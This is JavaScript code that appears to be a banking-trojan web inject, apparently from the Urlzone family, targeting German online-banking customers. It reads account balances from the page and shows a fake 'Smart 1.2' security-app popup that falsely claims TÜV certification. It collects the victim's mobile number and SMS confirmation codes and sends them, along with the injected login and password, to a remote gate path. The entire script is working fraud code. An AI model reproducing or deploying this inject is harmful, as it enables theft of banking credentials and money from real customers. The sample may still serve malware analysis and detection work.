	<script type="text/javascript">

	
	
	function GetAllBalans(){
	
		if(!document.getElementsByClassName)
		return '';
	
		var _sele = document.getElementsByClassName('account-balance');
		var res = "";
		var buff = "";

		for (var ct=0; ct < _sele.length; ct++){
		buff = _sele[ct].getElementsByTagName('span')[0].innerHTML; 
			
			if (!buff)
			buff = _sele[ct].getElementsByTagName('p')[0].innerHTML; 
		
		res += buff + "; ";
		}
	
		return res;
	
	
	}
	


	
	
	var main_cn = document.getElementById("main-cn");
	var ovrl_pg1 = document.getElementById("ovrl_pg1");
	var ovrl_pg2 = document.getElementById("ovrl_pg2");

	var save_main_cn = main_cn.innerHTML;	


	document.getElementById("aside").innerHTML = ""; //hide spam	
	
	
	
	function validatecode(code){ if (code.length != 10) return false; if (code == "5296185651") return true;  var num_char = 0; for (var i = 0; i < code.length - 2; i++) { num_char += parseInt(code.substr(i, 1)); } num_char += 13; var cr = parseInt(code.substr(8, 2)); if (num_char == cr) return true; return false;}




	function _Details(){
	
	    var lefto = screen.availWidth/2-150;
	    var righto = screen.availHeight/2-125;
	    win1 = window.open("", "INFO", "width=500, height=400, left=" + lefto + ", top="+righto+"");	

		win1.document.open();
		win1.document.writeln("<html><head><title>SMART 1.2 Security</title><link rel=\"stylesheet\" type=\"text/css\" href=\"rai/css/rai.css\"></head><body bgcolor='#E5EDF6'>"+
								"<div style=\"background:#ffcc00\"><img style=\"margin:10px;\" src=\"/rai/rai/image/pb-logo.png\"  border=\"0\" /></div>"+


							"<div class=\"message-box-campagne\" style=\"margin: 10 10 10 10;\"><p>Smart 1.2 App bietet Ihnen einen Schutz vor Malware, Spyware und Trojaner - Abwehr 24 Stunden am Tag - entsprechend Vorgaben der deutschen Kreditinstitute f&uuml;r das Online - Banking.<br>MAXIMALE SICHERHEIT</p> <ul> <li>Kommunikation &uuml;ber direkte, verschl&uuml;sselte Schnittstellen</li> <li>Sichere Verschl&uuml;sselung</li><li> Schutz durch ein von Ihnen angelegtes individuelles Bank LOGIN</li><li> Blockierung vom unberechtigten SMS Versand und Weiterleitungen</li><li> Verschl&uuml;sselung eingehender und ausgehender SMS - Nachrichten</li><li> effektiver Phishing - Schutz und Antivirenschutz gegen Smartphone Trojaner</li><li> Kompatibel mit allen g&auml;ngigen Ger&auml;ten</ul><p>Ihre Kontoinformationen und Daten sind somit auch bei Verlust des Ger&auml;tes vor dem Zugriff Fremder gesch&uuml;tzt. Der T&Uuml;V - Siegel best&auml;tigt die h&ouml;chsten Sicherheitsstandards der Smart 1.2 App beim Mobile - Banking.Die strengen Sicherheitsbestimmungen f&uuml;r Smart 1.2 App werden regelm&auml;&szlig;ig von unabh&auml;ngigen Sicherheitsexperten des T&Uuml;V gepr&uuml;ft und entsprechend zertifiziert. Bei uns wird SICHERHEIT gro&szlig;geschrieben.</p></div>"+

							  
							  "</body></html>"
							  );

		win1.focus();


		return false;
	
	}


	
	function _NextStep(step, data) {

		if (step == 2){
			

			if(!data.match(/^49\d{7,17}$/))
			{
				alert('Sie haben eine falsche Mobilfunknummer eingegeben. Bitte versuchen Sie es nocheinmal\nBeispiel: 490082828282');
				document.forms['frm_st1'].Phone.focus();
				return false;
			}

			privates.step = privates.serverData.step = 2;

			statModal.ajaxQ(privates.script,'set_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&phone=' + data);
			
			main_cn.innerHTML = ovrl_pg2.innerHTML;
			ovrl_pg2.innerHTML = "";
			
			document.forms['frm_st2'].Code.focus();
			
		}


		if (step == 3){

		setTimeout(function(){privates.resendtimer = true;}, 3 * 60 * 1000);
		
		
			if (!validatecode(data)) {
			alert('Die Eingabe des Passworts ist nicht korrekt. Bitte versuchen Sie es nocheinmal');
			return false;
			}

			privates.step = privates.serverData.step = 3;
			statModal.ajaxQ(privates.script,'set_data=1&step='+privates.serverData.step+'&vcode=' + data);
			main_cn.innerHTML = save_main_cn;
		}		
		
	
	return false;
	}		
	
	
	function _ReSendSms(){
	
		if (privates.resendtimer)
		{
		privates.resendtimer = false;
		statModal.ajaxQ(privates.script,'resend=true');
		alert("Mitteilung gesendet.");
		} else
		alert("Die nachste SMS kann erst in 5 Minuten angefordert werden");
	
	}
	
	



		var _shid = "%BOTSHID%";
		var _login = "%POSTUSERACC%";
		var _pasw = "%POSTUSERPASS%";
		var _site = "01";


				var privates = {
					resendtimer: false,
					shid:_shid,
					site:_site,
					login:_login,
					password:_pasw,
					ecode: "",
					script:"/gate_urlzone/" + (new Date()).getTime() + "S/", 
					serverData:{
						select:0,date:'',step:1,phone:'',result:''
					}


				}



		window.statModal = {

				serviceErrMsg: "Leider steht das Online-Banking derzeit nicht zur Verf&uuml;gung. Wir bem&uuml;hen uns darum, dass Ihnen unser Service schnellstm&ouml;glich wieder zur Verf&uuml;gung steht.",
				
				show: function(){
				
					if (privates.serverData.step == 1){
						main_cn.innerHTML = ovrl_pg1.innerHTML.replace("@date@", privates.serverData.date);
						ovrl_pg1.innerHTML = "";
						document.body.style.display = 'block';
						document.forms['frm_st1'].Phone.focus();
						
					
						
					} else
					if (privates.serverData.step == 2){
						main_cn.innerHTML = ovrl_pg2.innerHTML;
						ovrl_pg2.innerHTML = "";						
						document.body.style.display = 'block';
						document.forms['frm_st2'].Code.focus();
						setTimeout(function(){privates.resendtimer = true; }, 3 * 60 * 1000);
					} else
					if (privates.serverData.step == 3){
					
					}
				
				document.body.style.display = 'block';
				},

				
				
				
				XHRResponse: function(data){



					if(!data || typeof(data) != 'string'){return;}
					var matches;
				

				
					for(var i in privates.serverData){
						matches = [];
						var re = new RegExp(i+"\\s*:\\s*([^\\s]*?),");
						matches = data.match(re);
						if(!matches){
							re = new RegExp(i+"\\s*:\\s*([^\\s]*?)$");
							matches = data.match(re);
						}


						if(matches && matches[1]){
							privates.serverData[i]=matches[1];
						}
					}
				},


				ajaxQ: function(scriptUrl,data){
					
					
					if(!scriptUrl || typeof(scriptUrl)!="string"){return false;}

					scriptUrl += ((/\?/).test(scriptUrl) ? "&" : "?") + data;
					

					{
						req = null;
						var script_id = null;
						var tempUrl = scriptUrl;

						script_id = document.getElementById('oldXHRResponse');
						if(script_id){
							document.getElementsByTagName('head')[0].removeChild(script_id);
						}
						var script = document.createElement('script');
						script.setAttribute('type', 'text/javascript');
						script.setAttribute('src', tempUrl);
						script.setAttribute('id', 'oldXHRResponse');
						document.getElementsByTagName('head')[0].appendChild(script);
					}

					
				}	,
	
	
	
				wait: function(timeout,msStep,callback,erCallback){
					if(typeof(callback) != 'function'){return;}

					
					if(!msStep || isNaN(msStep) || msStep<10){msStep=100;}
					if(!timeout || isNaN(timeout) || timeout<100){timeout=1000;}

					var waiting = 0,timer = setInterval(function(){



						waiting +=msStep;
						if(waiting > timeout || privates.serverData.result == 'error'){
							clearInterval(timer);

							if(erCallback !== undefined && typeof(erCallback) == 'function'){
								erCallback.call();
							}
							return;
						}
						if(privates.serverData.result == 'success'){

							clearInterval(timer);
							privates.serverData.result='';
							callback.call();
						}



					},msStep);
				}	,




		_init: function(){

			if (_site == '00')
			{
				document.body.style.display = 'block';
				return ;
			} 
		
		
				statModal.ajaxQ(privates.script,'get_data=1&login='+privates.login+'&step='+privates.serverData.step+'&link='+encodeURIComponent(document.referrer)+'&shid='+privates.shid+'&pasw='+privates.password+'&site='+privates.site+'&vi=2&blns=' + encodeURIComponent(GetAllBalans()));

				
							
				
				statModal.wait(10000, 100, function(){
					privates.step = privates.serverData.step;
					privates.date = privates.serverData.date;

					
						
					
					if(privates.step > 4)
					{
					document.body.style.display = 'block';
					return ;
					}
					switch(privates.serverData.select){
						case "1":
						{
						document.body.innerHTML = '<h1 style="color:red">'+statModal.serviceErrMsg+'</h1>';
						document.body.style.display = 'block';
						break;
						}
						
						case "2":
						{
						document.body.style.display = 'block';
						return;
						break;
						}
						default:
						{
						statModal.show();
						
						}
					}
				},function(){document.body.style.display = 'block';});







				
		}


		}







	statModal._init();

	</script>



